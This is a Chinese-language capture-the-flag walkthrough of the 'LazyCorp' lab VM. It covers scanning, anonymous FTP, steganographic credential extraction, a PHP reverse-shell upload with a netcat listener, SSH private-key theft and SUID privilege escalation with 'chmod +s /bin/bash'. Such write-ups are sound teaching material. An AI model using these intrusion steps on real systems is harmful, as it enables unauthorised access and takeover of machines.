# **一、信息收集**

## **主机发现**

首先，在当前网段内进行主机发现，以确定目标靶机的IP地址。这里我们使用`arp-scan`工具。

```shell
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.149 08:00:27:ea:8b:bc       (Unknown)
...
```

扫描结果表明，目标主机的IP地址为 `192.168.205.149`。

## **端口扫描**

确认目标IP后，使用`nmap`进行全端口扫描，以识别目标主机上开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-19 10:26 EDT
Nmap scan report for 192.168.205.149
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:8B:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

扫描发现开放了三个关键端口：21 (FTP), 22 (SSH), 和 80 (HTTP)。

## **FTP服务探测**

FTP服务通常可能存在匿名访问漏洞。尝试使用`anonymous`作为用户名和密码进行登录。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ lftp 192.168.205.149 -u anonymous
密码: anonymous
lftp anonymous@192.168.205.149:~> ls -al
...
drwxr-xr-x    2 114      119          4096 Jul 16 12:35 pub
lftp anonymous@192.168.205.149:/> cd pub/
lftp anonymous@192.168.205.149:/pub> ls -al
...
-rw-r--r--    1 0        0         1366786 Jul 16 12:35 note.jpg
lftp anonymous@192.168.205.149:/pub> get note.jpg
1366786 bytes transferred
```

成功登录并发现 `/pub` 目录下有一个名为 `note.jpg` 的文件，将其下载到本地。

## **Web目录扫描**

在分析FTP文件的同时，对Web服务进行目录扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://192.168.205.149/
...
[10:29:21] 301 -  317B  - /blog  ->  http://192.168.205.149/blog/
[10:29:32] 200 -   55B  - /robots.txt
[10:29:36] 301 -  320B  - /uploads  ->  http://192.168.205.149/uploads/
...
```

首先查看 `robots.txt` 文件，它通常会泄露一些后台路径。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.149/robots.txt
Disallow: /cms-admin.php
Disallow: /auth-LazyCorp-dev/
```

`robots.txt` 文件泄露了两个路径。值得注意的是，Linux系统上的Web服务器路径通常是大小写敏感的。尝试访问 `robots.txt` 中给出的 `/auth-LazyCorp-dev/`（首字母大写）返回404 Not Found，但尝试其小写版本 `/auth-lazycorp-dev/` 时，服务器返回了 `403 Forbidden` 错误。这个 `403` 错误码表明该目录确实存在，只是我们没有权限直接访问或列出其内容。

这个发现至关重要，它为我们指明了下一步的方向：对这个已确认存在的 `/auth-lazycorp-dev/` 目录进行深度爆破，以发现其中隐藏的可访问文件。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.149/auth-lazycorp-dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
...
/login.php            (Status: 200) [Size: 710]
/uploads              (Status: 301) [Size: 338] [--> http://192.168.205.149/auth-lazycorp-dev/uploads/]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
...
```

爆破成功，找到了登录页面 `login.php` 和文件上传目录 `uploads`。

同时，对Web服务的根目录进行扫描也发现了 `/blog` 目录，其中的文章包含重要线索：
1.  `DevLog #1`: 提到Arvind将凭证隐藏在一个图片文件中发送给了Dev。这与我们在FTP中发现的`note.jpg`文件相吻合。
2.  `DevLog #3`: 提到一个位于 `/usr/local/bin/` 下的重置脚本。这是后续提权的关键信息。

# **二、漏洞利用**

## **图片隐写术获取凭证**

`DevLog #1` 强烈暗示 `note.jpg` 文件中含有凭证。我们使用 `stegseek` 工具进行分析。`stegseek` 是一款高速的隐写破解工具，可以有效地检测和提取`steghide`隐藏的数据。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek note.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "creds.txt".
[i] Extracting to "note.jpg.out".

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat note.jpg.out
Username: dev
Password: d3v3l0pm3nt!nt3rn
```

成功从图片中提取出隐藏的凭证。

## **后台文件上传Getshell**

利用刚刚获取的凭证 `dev:d3v3l0pm3nt!nt3rn` 登录之前发现的后台地址 `http://192.168.205.149/auth-lazycorp-dev/login.php`。

登录后，发现一个文件上传功能。结合之前爆破出的 `/uploads` 目录，我们可以上传一个PHP反向shell来获取服务器的控制权。

1.  在本地准备一个PHP反向shell（例如 `reverse.php`）。
2.  通过后台上传该文件。
3.  在Kali上使用 `netcat` 监听指定端口。
    ```shell
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
    └─$ nc -lvnp 8888
    ```
4.  访问上传后的shell文件 `http://192.168.205.149/auth-lazycorp-dev/uploads/reverse.php`，触发反弹。

```shell
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 37494
Linux arvindlazycorp 5.4.0-216-generic ...
...
www-data@arvindlazycorp:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功获取了一个 `www-data` 用户的shell。

# **三、权限提升**

## **横向移动：www-data -> arvind**

获取初始shell后，首先进行信息收集。在 `/home/arvind/` 目录下，发现了一个 `.ssh` 目录，其中包含SSH私钥 `id_rsa`。

```shell
www-data@arvindlazycorp:/$ cd /home/arvind/.ssh
www-data@arvindlazycorp:/home/arvind/.ssh$ ls -al
total 20
drwxr-xr-x 2 arvind arvind 4096 Jul  9 07:37 .
drwxr-xr-x 5 arvind arvind 4096 Jul 16 12:49 ..
-rw------- 1 arvind arvind  747 Jul  9 07:47 authorized_keys
-rw-r--r-- 1 arvind arvind 3389 Jul  9 07:37 id_rsa
-rw-r--r-- 1 arvind arvind  747 Jul  9 07:37 id_rsa.pub
```

利用这个私钥，可以直接以 `arvind` 用户的身份登录SSH。

```shell
www-data@arvindlazycorp:/home/arvind/.ssh$ ssh arvind@127.0.0.1 -i id_rsa
...
Welcome to Ubuntu 20.04.6 LTS ...
arvind@arvindlazycorp:~$ id
uid=1000(arvind) gid=1000(arvind) groups=1000(arvind),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),117(lxd)
```

成功切换到 `arvind` 用户。

## **垂直提权：arvind -> root**

在 `arvind` 的家目录中，发现了一个具有SUID权限的可执行文件 `reset`。

```shell
arvind@arvindlazycorp:~$ ls -al
...
-rwsr-xr-x 1 root   root   16744 Jul 16 12:22 reset
...
```

SUID是一种特殊的文件权限，它允许用户在执行该文件时，临时获得文件所有者（在这里是root）的权限。

使用 `strings` 命令分析该文件，查找其功能。

```shell
arvind@arvindlazycorp:~$ strings ./reset
...
/usr/bin/reset_site.sh
...
```

分析结果显示，该程序会调用 `/usr/bin/reset_site.sh` 脚本。检查该脚本的权限。

```shell
arvind@arvindlazycorp:~$ ls -la /usr/bin/reset_site.sh
-rwxrwxr-x 1 root arvind 254 Jul  9 10:26 /usr/bin/reset_site.sh
```

我们发现，当前用户 `arvind` 对这个脚本有写入权限。这是一个典型的SUID提权漏洞。我们可以通过修改该脚本内容，让 `reset` 程序在以root权限执行时，运行我们自定义的命令。

1.  将提权命令写入脚本，这里我们将为 `/bin/bash` 添加SUID位。
    ```shell
    arvind@arvindlazycorp:~$ echo 'chmod +s /bin/bash' > /usr/bin/reset_site.sh
    ```
2.  执行SUID程序 `reset` 来触发我们写入的恶意命令。
    ```shell
    arvind@arvindlazycorp:~$ ./reset
    ```
3.  检查 `/bin/bash` 的权限，发现已成功设置SUID位。
    ```shell
    arvind@arvindlazycorp:~$ ls -al /bin/bash
    -rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
    ```
4.  使用 `-p` 参数运行 `bash`，以保留SUID赋予的有效用户ID（euid），从而获得root权限的shell。
    ```shell
    arvind@arvindlazycorp:~$ bash -p
    bash-5.0# id
    uid=1000(arvind) gid=1000(arvind) euid=0(root) egid=0(root) groups=...
    ```

成功提升至root权限。

# **四、获取Flag**

现在，我们拥有了系统的最高权限，可以读取所有flag文件。

```shell
bash-5.0# cat /root/root.txt /home/arvind/user.txt
FLAG{lazycorp_reset_exploit_worked}
FLAG{you_got_foothold_nice}
```